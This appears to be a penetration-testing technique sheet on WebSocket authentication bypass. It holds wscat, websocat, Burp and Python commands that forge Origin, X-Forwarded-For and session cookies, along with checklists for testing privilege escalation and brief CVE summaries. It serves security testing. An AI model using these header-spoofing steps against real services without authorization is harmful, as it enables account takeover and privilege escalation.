# WebSocket Authentication Bypass + Handshake Manipulation

## When this applies

- Handshake authentication uses spoofable headers (X-Forwarded-For, Origin) or cookies that can be forged.
- Protocol upgrade has weak validation on Sec-WebSocket-Version, Origin, or Connection.
- Goal: connect without proper credentials or with elevated privileges.

## Technique

Modify handshake headers in Burp Repeater or wscat. Spoof origin, IP, custom auth tokens. Test what the server actually requires vs what the client sends.

## Steps

### Handshake modification (Burp)

```
In Repeater:
1. Click pencil icon (or "Edit" button)
2. Add/modify headers:
   X-Forwarded-For: 1.1.1.1
   X-CSRF-Token: custom_token
   Cookie: session=new_session
3. Click "Connect"
```

### Handshake exploitation checklist

```
□ Test IP spoofing (X-Forwarded-For)
□ Test origin bypass (Origin header)
□ Test authentication bypass
□ Test custom headers
□ Test protocol manipulation
```

### wscat with modified headers

```bash
# Custom origin
wscat -c wss://target.com/chat -H "Origin: https://trusted.com"

# Send message on connect
wscat -c wss://target.com/chat -x "READY"

# No TLS verification
wscat -c wss://target.com/chat --no-check

# Proxy through Burp
wscat -c wss://target.com/chat --proxy 127.0.0.1:8080
```

### websocat

```bash
# Connect
websocat wss://target.com/chat

# With headers
websocat wss://target.com/chat --header="Cookie: session=abc"

# Binary mode
websocat -b wss://target.com/binary

# Logging
websocat wss://target.com/chat --log-file=ws.log

# Port forwarding
websocat -v ws-l:127.0.0.1:8080 wss://target.com/chat

# SOCKS proxy
websocat --socks5=127.0.0.1:9050 wss://target.com/chat
```

### Python with custom headers

```python
import asyncio
import websockets

async def test():
    uri = "wss://target.com/chat"
    headers = {
        "Cookie": "session=abc123",
        "Origin": "https://target.com"
    }
    async with websockets.connect(uri, extra_headers=headers) as ws:
        await ws.send("READY")
        response = await ws.recv()
        print(response)

asyncio.run(test())
```

### Authorization testing

```
□ Test vertical privilege escalation
□ Test horizontal privilege escalation
□ Test IDOR vulnerabilities
□ Test role-based access controls
□ Test action-level authorization
```

### Authentication issues to test

```
Cookie-only authentication
No token validation
No re-authentication on sensitive actions
Session tokens in URL parameters
```

### Real-world example — CVE-2024-55591

```
Severity: Critical (9.8)
Affected: Node.js ws module, FortiOS, FortiProxy
Exploit: Crafted handshake bypasses authentication
Impact: Privilege escalation to super-admin
```

### CVE-2018-1270 — Spring STOMP RCE

```
Severity: Critical (9.8)
Affected: Spring Framework 5.0-5.0.4, 4.3-4.3.14
Exploit: Crafted STOMP messages over WebSocket
Impact: Remote Code Execution
```

## Verifying success

- Handshake succeeds with spoofed headers (101 Switching Protocols).
- Authenticated actions execute with the spoofed identity.
- Origin-blocked PoC starts working when Origin is forged.

## Common pitfalls

- Some servers validate `Sec-WebSocket-Key` cryptographically — keep the standard one.
- `X-Forwarded-For` only matters if the server trusts that header; reverse proxies often strip and replace it.
- Origin spoofing may need to match a regex / wildcard — test variations.

## Tools

- Burp Suite WebSocket Repeater (edit handshake)
- wscat / websocat
- Python `websockets` with `extra_headers`
- SocketSleuth
